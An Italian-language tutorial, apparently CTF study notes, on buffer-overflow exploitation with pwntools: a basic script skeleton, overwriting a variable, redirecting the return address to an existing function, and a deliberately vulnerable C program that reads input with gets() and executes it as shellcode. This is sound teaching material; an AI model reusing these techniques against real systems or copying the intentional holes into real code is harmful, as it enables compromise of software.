Programma base

from pwn import *

# Apre il programma
p = process("/path/to/program/")

# Inserisce l'input
p.sendline(b"qualcosa")

# Mantiene/Rende interattivo il programma
p.interactive() # opzionale, ma ci servirà quasi sempre

p.process fa interagire lo script con il programma

p.sendline invia al programma la stringa “qualcosa” trasformata in bytes

p.interactive permette all’utente di interagire con il programma dopo che lo script è stato eseguito, questo comando è utile quando otteniamo una shell (/bin/sh) e prendiamo

Per fare un buffer overflow è necessario

  • capire la dimensione del buffer
  • capire dove si vuole arrivare (quindi cosa bisogna sovrascrivere)
  • creare lo script
Sovrascrivere una variabile

il programma è relativamente semplice, tanto che non servirebbe neanche usare pwntools (vedi 👾Pwn), ma in caso si voglia è possibile usare uno script del genere

from pwn import *

p = process("/path/to/program/")

p.sendline(b"A"*n+b"input desiderato")
#dove n è il numero di dimensione del buffer + l'eventuale dimensione del base pointer
p.interactive()
Chiamare una funzione esistente tramite buffer overflow

Qua la situazione si complica, perchè oltre a sapere la dimensione del buffer, è necessario

sapere anche l’indirizzo della funzione all’interno dello stack (sembra difficle ma non lo è)

Lo script finale è il seguente:

#script generico per un eseguibile con delle funzioni
import pwn

p = pwn.process("./path/to/program")

elf = pwn.ELF("./path/to/program")

BUF = 32
BP_PADDING = 8 # vedere con gdb il numero di bytes necesari

p.sendline(b"A"*(BUF+BP_PADDING)+pwn.p64(elf.symbols["FUNCTION_HERE"]))
p.interactive()

Ora spieghiamo nel dettaglio come funziona:

  • elf = pwn.ELF("./path/to/program") crea un oggetto che è rappresenta un file ELF
  • una volta trovato il buffer e la dimensione del base pointer tramite ⚙️GDB lo si inserisce nel sendline dello script.

    Ora al posto di un valore, si inserisce l’indirizzo esadecimale della funzione “FUNCTION_HERE” , trovato tramite elf.symbols["FUNCTION_HERE"]) e convertito in bytes tramite pwn.p64().

    Facendo così, si uscirà dall’area di memoria del buffer, sovrascrivendo sia il base pointer che il return address con quello della funzione FUNCTION_HERE.

    E il gioco è fatto.

La Shellcode injection può essere fatta in casi abbastanza specifici, per esempio nel seguente codice c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}

trasforma il codice messo in input in una funzione, e poi la chiama.
